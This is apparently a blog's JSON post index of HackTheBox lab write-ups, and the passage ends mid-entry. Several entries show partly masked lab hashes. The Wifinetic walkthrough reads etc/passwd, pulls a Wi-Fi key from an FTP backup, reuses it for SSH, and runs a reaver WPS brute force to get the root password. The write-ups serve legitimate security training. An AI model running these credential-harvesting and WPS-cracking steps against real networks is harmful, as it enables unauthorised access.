9eb0151af0f6026d79b0ae9138b29ded6160b07c7a6c84a779986d6344b931b8affc473c978128e855da1c5e1875bcdfb435bd3cdf2dfae89f8e8f730579454ffd82ad71f0df370066361da758aad90c027a06d5ac799c217dc95322d91ecb80770585862cd5e0810a7cfd3996259370d06346d24fb3f951ae21b4a1d0a61eaa5b5d664062f73a31e951d64d0c5e5aa8dc96c596023547ce5c70cacc2d9f2aed32b7b8cdfca04bb273cbb19fac7ad0e661ba74f2757fafc59a2b5c6279cf980fd7802158f99caa1624d845d933665bee76d42185a4523e8b75f535f696e569a5430c706b59fb0814d1188ee644f16e720271dc8f1a2afd96e45b695d35ba2ed6679e58dafb16e393ba5ad60b5dd0816d1dfbbe3836aae190569f5f86a621611de3b743a75f9226148a67a7304209a0922e13350dcf146b0edbf78985b87dd9c4db1302bcd8e251168240fcd18a4c823db2b3c130d5b325e91d284babd17bd212a8cce38f26c9023c863e91673eca0ca8d70638302b9c4816705a0dcf2b7a56f0d3436472e7e683215b111f8f92d983f88590923af37617c14fffc0aa0b6daac57b488b9f1b4dd207104e19dbebae79625c9409b28d3edcb2e78b243ea8d36978493d5dad164e0d2c34e4b4fc3e1868b1560f038aea2ade72a0bd17ed56f68c09e75336325c3cb09c59001dbabe809505964d3e78c77e40cb735bd789aaf9fa0c70eaf87f14fc3cc0dd1c552301bd8882762a0adc16308e9b0b8250cba0c0e63d5e62dad81b3e4537a2795dd227965d3b0a1a54352503eb21bb21aca7491d084b364342d9d406a0fee647bb79a8a3faf93939477526c8eac41f59a00a0fd9c136392278ad5be529dec2eb71b61fbc688b38985379debe8d7bd64e944975f83bc650fc14af20f46e6772430afcbc5814897e45277aaf31f399167158818c1424cababed6a31569b154480b480f38a951ffa9b5b8f679c564ba1f183c3565522b819e6603ee7c41360fcd53336f4f987d9102b479ae0355b6517dbf64645fe48e2837054d4b0ff755fa1907028f0585c9940bd04e4bd82e2707269cd442f5a5d06ae4d5ed77fd83fbaa302760e9bcf7031e3359a7d86cb49bc536ef6a462e4b0ed1268950c82eafc2e0fba9dda32b9c16264bfe9c1304065f377785f3576b1fb8bdaa097d2bd3f5d5efa1dc8e338533fe2d97707168ee89689ca05d34d72186695ecbb8cdaec7f01f1008399fceeb6537ccf57df084aade598d0873cac0daf630360b518abf117d60202b34e616f8c3b5bd445a1d020c61964e2640e4d4f01697f605c417443414a7d9d52ff3e6effdaf3019a636cdb492868bbdfdbc1a3b8d9f683aeb84aa3df1bb96f83be17bf5d4aafafe7edaba4c78560aba147a5602844b84fbfa62a957a45485d6d8ab1d5ef47b8a6a12b363dc6a11a249f227ba3489336ce96242f6c11e22deaa40f0ae3fea15f102d839ec56645de7862ff09ef6a65d0cb551214336640bf632af7653a56f7cf808e1413ab5e7ac248bda32f254183f27936ee0fd678316c68e52b903d6bd823a4e80e6b13067ad16657a130abeeb7cd16975fe48571085254ed7870e46d54a8c2963e47563e7d9933899c785ac93ccea2efe2d2afd120f360203aefb8dc9a33e3de7de86f571506e62004859a6e27e5c8071039adebf457445e19f0d8574f8888069d5adfd54b0f028e0c4b786556925d795dd3f1595b859f7d24934b7aaeafd74cf5db2d2bb38cf880fb1bae93aac75d1f08d510b29cc43e1080a53eab4ced5615d7cff11b58fbb1b9aa260febf99a90d8a2504225a5590c3fca23ccf233971097e752324c60c50d9d38bddb5ecb07747d87f94f3df808f52dfa0b12f176b67ffb82898bb198d9e56d014337cb7dac63d128c54916ce26dd9d4d5397c0da890277e763027854cc9eaadb18c70782cb3bef0415c2541f75f3062a7a85a7d27d66dac490a6501acf666730a2f06e6481b635bb67e1347f28f827ff86f5f8d30b6eb8c5119cb8668caa4a18761ea4e083c32662ee9608219ab03a185e6498743554c32d5fd01a20563597af2af503e8b03e9044608482b3e14995ff100cede5c232f8ddfa72000d31e070b29a52cb3060015ad3f5f3e1981f0a2da703325be6094988e6c30405266aba9d712bbaba6154a99607e43b4be04be61e63db2595c169361c1a9efc9d0adf8046dd97d74aad14c3af4b2080580a39a7ed653839f7db7329877868f2314e4253e3a97d0cdf09a5c7c820d57486792d625798cc4e6f0c129a4bd8e0dacd79ef1ece592e574a913fbcb5691b8316bd1741af84f130279e154acb9d555162776f3854f2c7177c55353b50a4c854d422e0af1b223ccc278dea19e309fcefcd01aa7bad1cac5043cebd888303c7f9b6192cf3f0bfd87972d9996dd030dff0501ce8291604bb2c06db7e28683bce1f52add5be49fcfcaadcbeec74dc498bbc7ffb1b297f59affccbcb61282bf26f3ab65af04fb75e023073a1527bb0e01cfcdae3c404a689b0108edbcd9d1f2f87615108f2e2bd9d6e699cb2ab86ab1e5ef7ca4688ffc5de1f9c95ea34f75726a9f2facc34d0b045c74167edb6a61148eb431aa855052168941328560b53e88f81d69062dc5c0f07eefe0a507dd5d77e00991a019d903a29659b0d8c5f59d6b69c01074c36b0967b0f8cce4d8c6c2853254f83816f6f7fe4f2a470e7146a9ef84b18a86ee4bb8c90e8dd0f2fa03813762b5d7c5b1df2eb1dc2cf8ba84c308fcc56ce77594d228a0c9425d8f5e42e5d26ad393b86e1305dcd7bea2cf84ed3d6a96507fde8feeb221b500de467999378bb20a4de4e7d771f2babd1c56c6446416ecca4897d8be03ab8cb0d74c0638e67b089bc9432925283c445f64fb412050b691b6988282cc3617af6ea140bc7e089dd39b884bd62f6c772f83c866c2b6ba7c5f953b62eb87810dabba9556e0bb9e10ad965f93d6a536374b3e706ff99f6834445cf4f0891f301f7aca61a0750f67046ef56ce4f9044e2afaabf9e008961512a557caba0935a20ca5bc61ec1191c6382ed763d1975579fa003ed287eda22c2c7b7b9dd90a3695fdac41c969ac0d001c3c654afcd3f919a697b4f2a7a53327835ac2b05eaab3347109ddcbfd58d99f5e5fcac176393dbc9f28dd51d1b2b8e9273af6e97b6c9290a75a9ebc89da678b58bacd11617e97a1bf501559f898a2980afcd882e0f4180f4510ab40a0e285a6efc8227ee1f8ae5cf24eafaa86e8e74d21c9acfab9eea5e097a7c30e3e48a7c2ef71a8cc66676c18995ff734c4e504ec46a9ea4916413630ab6bb1e7e4ae8df22f099318097d1b6dc71fff9d88affd047ea4b7fd48f2ff8119bff97fd1555748785c38ee0dddaba5cfa75934cbde1c738509edac62c0ad1c50d4e94ab61351a541fc455f3dba5e8aa8f07e10c0781f6a4f1ce06af2599b8960e53ebf289c2b9e5e813366ebe125dbb5c2c0ad7dce1911e09089594a4e6e8ee2506f687b7c60038d80e384a3171bd6b90f86bb752354ff383521818156a047b21e7161b12afb853bf949a0c6f2eaf96797dbf46881121715cd9de6a4ce83711db96ec1b9b65f359ed81b2284651dbc139df6cffb5c54a9c931f13920143f6b688f02d6330908e4df9e1015cb99b181f46f843f71a450ccbdd0ca80ad4e96d653a51b5c5fee59b14416a70378acaac11167883ca833e7ab8557baa6a962f06526402db89482166ce860812ea46dc6f5d32e7bfdf75dacd42205711733f7b0f6d3ffee562cd55c747772c0cf03c87f591df4b40bfe6e2ae36533fabd5704451846726c6421891a8cda931369ed4d0e0302efe11da0ff165803bcf1f6f9bdb8a505408b7242e688a9510bd348343b4d66173b1bdbd3463d1de96728243d5561da18a07948f689401704835e84a94b433a6fd3fb627f04efcf74fb2ce94b9f3b148fd4566b46f18e6c9b26f0d1c96c3ea59835dc5d1104c27bb6c67788fa501948e165808fed253441ecbd7ed23c32b87d7169b4ec8c7140f2298882f726355c14268401945e1ea9237130defd49695dbaee64fe718a482ebcaf2239b6d0fb223d0e799ad77b71e6e1fbca2ff72f1d929b14f56a9aac43abb5e80503dc3a1d00433a8081aadd5bb2f396309197fc20d7fc605da7f32ed3c14e31eb72d5a42bde226a4e736eeef5be650513e6d29b1d931aa635c4db0f4a433d5b97ca99410864eaedda9e4df121d8d6cc4954807424296a85bb8580fd0869941c583907c7099e6fe18b0be8ed9fddd99996d5f3217e3c5a72fbaa565d3e9a03e2169ef0f565b7f7d6b8fb1f80ac07b2d4f9035317abe33c0fbe943da3c4402467ddfc5b3bd1b690b11b8ae2683c29ef007d111ac05448e2388a8095b2bdad3a7f13049098b565d54f9590cb7ced06e474c85a5f0a281bee64a49ac42727f01c9e2e1e5769fb6459cfdd74fdbd4af1304ca4c75c6c90130eb3c28787290dc064ca791d0f215fe6453d99680823b0142afb983c14e1a5ee90d81a71be4a4b3d17c3eab80277b0d20ab5a6b760ecfa43a7c8548e7706749b94bf4647feceeeec7fda5a5a105cfc4a7cede3048c54489ce30e1e388f4d3795a6dc08602e4aad38cc2ceb6d662409f527267a251c61efbdd3c496fb6474164caa70645f0260e5084f0bd02da878ba6f8ce09d484c698994a9d3c3c53e97340862e99f6adc7fc89d00594ef70800625a6e38d180955038150c010c9fda4c6db66cdc506b6d9f88703be73e0deeabcf0d2f520997c1582717597bf26517a54fede042cb92079a408a2f4c6c75ddbcecb19e0cdb283b8499ffb6cca72738203bfe0cce26827d2a26dfb9fb83f20e4c0a7687d2d5c45d0c27f3cd18d129b93d6247f7ec28d11c8d9afed4a39f737d068943b3d7c6661a45d4b4dfc2c6640da64d7949f51d7d457acee4a9aab17d018908cf7e4114c0d4e7070a4116b6d43f26a1f1ddb767971197f0397c8a11f5d63f7a94d8de21bb3b36db95bd8bdeb6b356dadcdd142523b7d371a0552f45ab9cc02e072ec087a3999692f485639a4a7ba59b202a7bbd16c8483f48f3d8dacceac06755206b9feda7f37666bd56fcfd66c00dbf1020216517deb77e69cbf38a9adefb884393417a2c7e9cf82766cc638cb5a1adc159f636398c6c946f62953ac496c6cbf158196a41a7d41051a4d43e649bb825d57dfd6311d9021a454a4bacc48b88db39747741d0937cd1af83a6185ecec05aa866ca67a9ae3aca2fdd7db698d6e8b87b4d85d22b7a97d1b1eba894a583d2dbb416d0ba7a0d8837a8608921caad8556dd891e843511822ab35cc756f2719ab0492dc963711b0a622ab54894808e7e9003e26c5f58bbd982ed4e1f9dd5c70f8f9226250bdacda074f95afef613a1f092ee5fa39e9c59411806d38edfd7f6cbdb1ac15860dbc879e1d163b6a79e1df68434fafc64de16d65581e3eab91883faa3d6d434c9fc80bb2b8c9a91111fd3fc32ea6ab10c7d9a53ec6409b0ccbf51ee10b8a0c141c0fcdf89f81bd7bd8b024d15c9e21578d8c4f2611550d20cd90469f242082fc89e0b9868f7c5aa2100ba2f1d69ad631f92ec7cf8842f3403db96473566ca694989624164002ecf088058c220d0034734ac90c5a44947258abc48fa14755b118b50df2900d51cf0cbb65b7a5d8b553f622844012254377a223ed3760c8c8e687047ce0e23a706ac219f2bc25ea3c712e16547d5169173e1f07bd8e21dc0847dc834286c377ce723499ce6d9d4fecca9f8d5539ad2972f33ba57f76c7d0b7743badade0c9ad60025afafd9d8cc41a9eb69eaeff16d4a946ed79c52ce0e2125f4a8caa2fa37ade397294b7f762901eeea62edd1f64bcc34747de3b925ce546f9f9c66faab3cf6659e4ed21736a84ad975f093d36bf33fa7e6f43d0d6c3c75ad0205e925fa6c980bed18aa3607f9e2a744cef48787635f00652987e828cbb66874c30846925cc11d4c2ce9889b3d7468e8c178e6a3f6ff8a6481655afd4bbd46fb15431419dc795abfb7f701a40688b8e1fb13206e5b84e4b871ffb1f31b63d54bad74df1d8b4c34305e4103911eddecc9d65f7210b7a7e1b4e5f4eb988b6509ef95199efe8d26cf579bf36a07375899b7fb01fc4a3f1efa3f90f073ab409aaa94223c7222c11c7172b22a990f5572244dea0b3234f08cd3231b2755336034ad771154891c61aa7a957f4092ea65e1061364ca0a375c8c811551c26368084a7be7e08e9568956ef3f900212b881608340727a5b61eda91373353348693eb9db25057c715d73284584adbab08e93a3b54e68d4b076b3dac69b6ae1f0476ffef1797ed8212a9e8472733b50c816801f67adff8db903a0f8031990e8619002a3484f95b998f0c49ff230c35886b3856995900a39d00d18c1f637606697365fcc06dad22b275722c2e38c18b908d91d69e34726d4e0a000a87ad5e4d2ee7fbd8fb8e430c209f2af02a177a605a3aa1eb78ca95fdab5a8cd18d838ce0ea54a85b759fc4e06e12af5a749c152c8314b527d2d05b1817423ddb13442a49b0a89ada850f2da713e3220733521ea65ac0beedc895cb4a9c46a4143a55d6614c339a5a922011473cc2a6ab8cbd6db98886de3a834451a58ef18b87aa8cab5b102c0f25bd7bbc62598c33f1369a5a67cfb092a9bd0f2ca232fe6dcfc07bf24498cbd740428d1d3b33ed3b88042ad4e6cca88240f2785dd28ad5cbd0c7fd71930642ec73d5acd7a5ba7409ce22b692a9f9bb15374a943f7dc02a5445599c60264e6ab48c3272c9ff7585304f68b42ac00ae98e77d9f12b6bddb30869991a7149a2e30c663386a114f376cdd248b74a839f081219c15077aabcadb9647260fcdd2e25fbc1e7ecb518e3291d09104d78c4c903a8ca19ad67d4381d975c75902d322826343f7840dea2fa1e4036bbe75af089799bcfb7094f4bf18ec0cc982dbe41949fbbbc90d65e91fa79524b72c8f5205f3d4bf95c58e67e6fbe08e884b9a293cdcdee6793070809afceb7ef7ebae91f18a86573d51cbd1c407043117bb6c3cf068c3e3578516359ad3e7dd7f08a7a8c5d9fb4ecb4c7c6ba315af0f1e5cd36da7e5722bfc13c331dc9ecd00c5498d608af24cfd21bf4ace7e088139c49f5b6950360e5257df795f01ef0f88820bac7cc7dc806c2bdf3f08358228b46bb55d60558d2244f580cd94e536e6bd7577d49e7b46b411fd77477a6be976e8b956164adaf4605c900afe026b1f605d8ca75912a5f569290c0d732ab98aba1fbcdb135616db21d6259b6aeee1b4dc7bc37584c40a494b6f1ddae53c6bbdfbce44669307a04d1877689380b34ffa3efa341558c4e0dbf657bb107ea392a44b96e5f57b4c0e8011cc2b0436472e502af64e1d41fe734e9fa484542228c9cdef40c6d2841d644793e40a5ad9193a32415dd4fe6ac278a54041303f0200c7542d8eeb9a883cf8495f873548468678d75482dae7b8ce9434b7de544f267f631f0d2cf57d25dc2f80ede24b28d670cc3db7173893f1a743c7f083c35f6eb7c0e5373edcdf25f4e1d4a434f5559f79f878beb262c0160856b5b9a0b18d11cfcc507cf10798944459afe13a08638d790299041d550580cde80b9ce26bc99fcdc1b70ce9521f2fab175188d412897e121b21d7c968965e9105f8236558be0631e2e4b736c3b55c6da2e7020fd450acbe484265284bda6d5f586aa41c413fbb0921a9d48e98e220a6b9dc252ff8e54d6c417da75f575c16ed3b1e5d6491a3d35893cb51562dbabfae640f59055084738fbddd39548ea3d859b5669842ab60c6e5b2c1938d03ade04a5b6724c2de783a1bc7fd466ef42b096c0bfccee84e28893c86c20a14ac36bacbe3aa9e3cb848e74ed34ce72ac6e7069287c1316176270b2f43ed449d62687fde8a637ad6e24a537c52d2436c6c3ad82b2e1c7fbc77cb66207c3a156b426817e3e83be6106054d9fcd3b4b169d8c3d586ec24b18d1a00a78748abc727ba3fefc69f21da9ba31c13869743e5284bab86a1efe8b45b6dd086494d16436a8c85a6768163bff52346a4230ef1ff270170eae7c3fd7eba8831846264861daad9cffb0172911f715a1915fd988d525559e6e57c5f3f94e020d1bfb0f1947c14240845ed76fea65ac1c48413b9ed65cebbed4d7f246f6bad3fb5bd4303e0d3941c3bea2e7ed23230eff4e8cd23610ef631e4231e03eca36c5fee9908f2f246c68e014080c696abcfff3731628289aadd417c7a42c2742617b0dd9e766c93ad8bd4c23dc0d9361f3b0cc0719dcbd809ddba8534b44a5c8cc0846f568ed5f23d4df003afa6fb46ef03a07c60e539edc08b74729b3e955c2a9637db02ac5ca7d67bd35e8e0a55946e64973f5dc41fea4bdfe874bce7c480dde4cb53e3ae82a4a5371ab43ae790148fb1ea3fddf1576c8ba458516c8dee286def5c86f89073350dd900c21373bce301810c729fab958e741a13e32537aff36783390d60b6f7976960045c95d96919db05a6f1381813fd0923a8bfaac2414ec6f673ed0a182e43a59a7e9122ffce6966f254066cc68f93567c41e9be633577391d4d6d2e4074b0f510c6b5148a66f06d44d3d147b060834bbd951aec0fb5052cf12beb6bcda4e43fd80582f2068640b4c4a77b9b8b9ebfca7a4f9bc18d07c5adbc40333cc13c6bf8431b3b4d9b7105788824f8b7b5e156e8c4caa581ec33a315e5448b2fd601005c508346ecefcc6563399e0b4c58ea292e7dee3aef1475b1e8ff8e9b8901401c1d246bc6693a1bb911402671f95554e93681bb76d0ce33f0fbd8d0f57acfb5c96a4576830011787db0b1ee08b5d40d021581fcb2c7eef25ec37f438f541fc6ee052d3793c2686b4af5a2784807b9a5d7fa333be1b31304d0086657100a94c32c243b673ff76ded4124191ca7f72826583924741f1205c899cb5cf9a743253ca2a0597f2ae851c197fce53eb1e9e202338cb1b7b50f4bb27334cf636f3380f824459cd963625db853622c2c55481f8d9aa5daed2a9e7983ee3279c0b468a2cd83f40cbb8ab012a2699f9de6ff57426681189b6030236dcd1573ef6200621665045298260b79a2c695fe31266069026546f7d1c964f3af6281ec34fa5548949095a04b83fbdf1b7ee9d58771b160525a53a4257b8d198fc129faab0447cd3f198d64ad4ef499062f6c114d178d9303dcbc70856e3e4ebb47ba0157c91baf96424fe9b9b8a232fb28ecf27794790595997457d0808add867f01229b19af85888319d1b234d5bf7dd459c3662c65e0786569da198495ac4af4a72f940e586058b1577ec40e3f67c5c36d006cf57c9ea16a867da9a3a52f4571b0b75acd77e320d9a52a280536973caa139692e614efe5b7da360d0eb7cfdd635bc7bfb7d55c84895ad3f675d0999fd4cecd0f86a3f894402cea2956739a554aefb809a47e82fcf78baa5483dff3f83c49ac785e9279530ecb6dee22aaca61c4fafa81bc1c367e1f4cf4c057f0cbaf7e8db79b1a7a3960de0bf537b6d2525269e0bfeaa6e0d7ac4c4e9e4207c94a6c4bf00f19aef9b98986bce16b23afcf710f4178836594bc8e56ce9fd52865b38aa134c5a5919da35616dba59f7032b5f8093e4f56cca47d422fc67f5c24722bbb2d790005d6dd3e8731a6aa431973d0c2bc84c4acea704893df634701a04ad4710042d7e2259b5ccfca9228b78bb236604ccefc560ad8ce61ffdf51574a6a656f5f3f08834f4e52552b5f9e007d02337bba20c8a6d32784312b01f71c1ae8e73b31281585374b4915d5f896d9061a3c70f347c350e479f0af65f005c015b647c73d2cda2a24413f1761052f12dc98ffd8f554b20ff2cf78c40b3d9cb977341c3f0414f57cbe44dfa86361181a45bc96d4b00eae680aaec23d0e5eb54b8393668bb5d313aa33365906fcd5486b33320aa65eb03aec3be950b92fc77bd6785c6041a46746c8c74b5a34ad37ea0f275cd0e11af92f496b4fc98413fdca7b4589e787b6d3bf8061f205ce6fc897d3a560b0d275a5b907977ef4fc4b61b69f5dff23c1fd964e8797478a96e2643d034a1d378f46bb35fa5dcc88ee0c70973ded398c32d3590c2383b7430342b6064f5f1bdebd97e9b9efa5732b8744bced4b7d10c2567cb5dca7abc187c55b130d7d69d3369c636e6115537239dee5c1806816481fa28e997aae58e62856d889bae7dadd41b40da28254fda28e59cda83ce3d0b492bdcc180b70c373f61f6d5a69674582c355d89d0d0fd557243fcb14b7b5453564ed408680eba3122b50f0f6abe06a8e07d36ef10fea8bc0877836379520b522c558c507af90a599a8814d9769c68d9de87fcc33b504fb762f6c669e95e12b863b8465f2d44204bf26248162042c7c5672a88bf4bdd66677acfd85255af88736cbbd9da22d098a10b058fddb0bb26af634162312afd9173fc812ec83f346fe03b8ee660ee0f062661cb4d0b394a7eb896b005c8a37de28ef3fabdbb9882125f6db2feff726fb5322ae3169b81782fd820dfd78333324dec67c2b2d4ecd4c592d2052c75044edfe4fa10e04c452acd5e6d82815991a239b308e298c4b8bb417db2693ddbbc38a8c784091977b072c5a3add96fa712a0757c2231f3e5f974eb37cbc48588c61d24ff05b0cac5d59c81133fea8b32d18965f1f9fc6b461a021fb7370315541f275578c05d345d3f6b749e9b","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Drive - HackTheBox","slug":"Drive-HackTheBox","date":"2023-10-16T08:37:03.000Z","updated":"2023-10-16T08:44:23.002Z","comments":true,"path":"2023/10/16/Drive-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/10/16/Drive-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. root hash: $6$T11qOD******9XEsDc2R/k1 ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Analytics - HackTheBox","slug":"Analytics-HackTheBox","date":"2023-10-09T08:25:58.000Z","updated":"2023-10-09T08:28:02.585Z","comments":true,"path":"2023/10/09/Analytics-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/10/09/Analytics-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. root hash: $y$j9T$aVUk******j2ktqM2 ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Visual - HackTheBox","slug":"Visual-HackTheBox","date":"2023-10-08T07:26:01.000Z","updated":"2023-10-08T07:27:20.043Z","comments":true,"path":"2023/10/08/Visual-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/10/08/Visual-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. Administrator NTLM:1004******cd94 ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Clicker - HackTheBox","slug":"Clicker-HackTheBox","date":"2023-09-25T07:20:54.000Z","updated":"2023-09-25T07:22:11.440Z","comments":true,"path":"2023/09/25/Clicker-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/09/25/Clicker-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. root hash: $y$j9T$HwhGT******4GSfg50 ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Rebound - HackTheBox","slug":"Rebound-HackTheBox","date":"2023-09-14T01:58:00.000Z","updated":"2023-09-14T01:59:13.354Z","comments":true,"path":"2023/09/14/Rebound-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/09/14/Rebound-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. krbtgt hash: 1108******664b ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Wifinetic - HackTheBox","slug":"Wifinetic-HackTheBox","date":"2023-09-13T06:13:15.000Z","updated":"2023-09-18T06:15:03.812Z","comments":true,"path":"2023/09/13/Wifinetic-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Wifinetic 10.10.11.247 赛季休赛期,piece of cake 端口扫描21,22和53: 123456789101112131415161718192021222324252627282930313233343536$ nmap -sC -sV -Pn 10.10.11.247Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 13:45 CSTNmap scan report for 10.10.11.247Host is up (0.15s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 4434 Jul 31 11:03 MigrateOpenWrt.txt| -rw-r--r-- 1 ftp ftp 2501210 Jul 31 11:03 ProjectGreatMigration.pdf| -rw-r--r-- 1 ftp ftp 60857 Jul 31 11:03 ProjectOpenWRT.pdf| -rw-r--r-- 1 ftp ftp 40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar|_-rw-r--r-- 1 ftp ftp 52946 Jul 31 11:03 employees_wellness.pdf| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.10.16.9| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)53/tcp open tcpwrappedService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 46.38 seconds FTPFTP匿名访问，下载所有文件: 1234567891011$ lftp 10.10.11.247lftp 10.10.11.247:~&gt; ls-rw-r--r-- 1 ftp ftp 4434 Jul 31 11:03 MigrateOpenWrt.txt-rw-r--r-- 1 ftp ftp 2501210 Jul 31 11:03 ProjectGreatMigration.pdf-rw-r--r-- 1 ftp ftp 60857 Jul 31 11:03 ProjectOpenWRT.pdf-rw-r--r-- 1 ftp ftp 40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar-rw-r--r-- 1 ftp ftp 52946 Jul 31 11:03 employees_wellness.pdflftp 10.10.11.247:/&gt; mget *2660407 バイト転送済、8 秒経過 (317.2 KiB/s)計 5 ファイル転送済lftp 10.10.11.247:/&gt; exit 得到的几个pdf文件中获得一些信息(也没什么用)： 123samantha.wood93@wifinetic.htbinfo@wifinetic.htbolivia.walker17@wifinetic.htb backup-OpenWrt-2023-07-26.tar就是openwrt配置文件的备份，其中可以得到用户名和wifi密码： 123456789101112131415$ cat etc/passwdroot:x:0:0:root:/root:/bin/ashdaemon:*:1:1:daemon:/var:/bin/falseftp:*:55:55:ftp:/home/ftp:/bin/falsenetwork:*:101:101:network:/var:/bin/falsenobody:*:65534:65534:nobody:/var:/bin/falsentp:x:123:123:ntp:/var/run/ntp:/bin/falsednsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/falselogd:x:514:514:logd:/var/run/logd:/bin/falseubus:x:81:81:ubus:/var/run/ubus:/bin/falsenetadmin:x:999:999::/home/netadmin:/bin/falsecat etc/config/wirelessoption key 'VeRyUniUqWiFIPasswrd1!' user flag得到的用户名和密码尝试匹配，netadmin可以登录： 12ssh netadmin@10.10.11.247VeRyUniUqWiFIPasswrd1! 提权信息常规枚举，发现reaver的特权，这是一款WPS破解工具: 123456netadmin@wifinetic:~$ getcap -r / 2&gt;/dev/null/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep/usr/bin/ping = cap_net_raw+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/bin/reaver = cap_net_raw+ep Ubuntu Manpage: Reaver - WPS Crackerhttps://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html 查看网卡也可以发现处于监听模式的无线网卡wlan2和作为AP的wlan0： 123456789101112131415161718192021222324netadmin@wifinetic:~$ iw devphy#2 Interface mon0 ifindex 7 wdev 0x200000002 addr 02:00:00:00:02:00 type monitor txpower 20.00 dBm Interface wlan2 ifindex 5 wdev 0x200000001 addr 02:00:00:00:02:00 type managed txpower 20.00 dBm...phy#0 Interface wlan0 ifindex 3 wdev 0x1 addr 02:00:00:00:00:00 ssid OpenWrt type AP channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz txpower 20.00 dBm WPA暴力破解使用reaver来爆破密码: 1234reaver -i mon0 -b 02:00:00:00:00:00 -vv[+] WPS PIN: '12345670'[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!' root flag破解得到的wifi密码就是root密码: 参考资料 Ubuntu Manpage: Reaver - WPS Crackerhttps://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html HTB: Wifinetic | 0xdf hacks stuffhttps://0xdf.gitlab.io/2023/09/16/htb-wifinetic.html HackThebox - Wifinetic - YouTubehttps://www.youtube.com/watch?v=jj4r5lwnCp8&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"CozyHosting - HackTheBox","slug":"CozyHosting-HackTheBox","date":"2023-09-04T06:37:58.000Z","updated":"2023-09-04T06:39:31.376Z","comments":true,"path":"2023/09/04/CozyHosting-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/09/04/CozyHosting-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. root hash: $y$j9T$nK3******8l8p/w15Sp2 ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Zipping - HackTheBox","slug":"Zipping-HackTheBox","date":"2023-08-28T07:22:38.000Z","updated":"2024-01-15T00:43:11.705Z","comments":true,"path":"2023/08/28/Zipping-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/08/28/Zipping-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Zipping 10.10.11.229 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.229Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-28 13:59 CSTNmap scan report for 10.10.11.229Host is up (0.25s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)|_ 256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.54 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.54 (Ubuntu)|_http-title: Zipping | Watch storeService Info: OS: 